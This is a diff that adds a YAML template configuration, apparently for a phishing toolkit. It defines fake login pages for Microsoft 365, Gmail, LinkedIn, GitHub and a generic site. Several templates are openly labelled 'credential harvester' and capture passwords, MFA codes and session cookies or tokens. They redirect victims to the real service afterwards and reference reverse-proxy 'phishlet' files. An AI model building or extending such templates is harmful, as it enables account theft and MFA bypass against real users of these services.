@@ -1,0 +1,49 @@
+templates:
+  microsoft365:
+    name: "Microsoft 365 Login"
+    description: "O365 credential harvester with session cookie capture"
+    target_url: "https://login.microsoftonline.com"
+    logo_url: "https://login.microsoftonline.com/favicon.ico"
+    fields:
+      - username
+      - password
+      - mfa_code
+    session_capture: true
+    redirect_after: "https://www.office.com"
+    phishlet_path: "./templates/microsoft365/phishlet.yaml"
+  gmail:
+    name: "Google Gmail Login"
+    description: "Google account credential harvester with session token"
+    target_url: "https://accounts.google.com"
+    fields:
+      - email
+      - password
+      - mfa_code
+    session_capture: true
+    redirect_after: "https://mail.google.com"
+    phishlet_path: "./templates/gmail/phishlet.yaml"
+  generic:
+    name: "Generic Login Page"
+    description: "Customizable generic login page"
+    fields:
+      - username
+      - password
+    session_capture: false
+    redirect_after: "https://example.com"
+  linkedin:
+    name: "LinkedIn Login"
+    target_url: "https://www.linkedin.com/login"
+    fields:
+      - session_key
+      - session_password
+    session_capture: true
+    redirect_after: "https://www.linkedin.com/feed"
+  github:
+    name: "GitHub Login"
+    target_url: "https://github.com/login"
+    fields:
+      - login
+      - password
+      - otp
+    session_capture: true
+    redirect_after: "https://github.com"
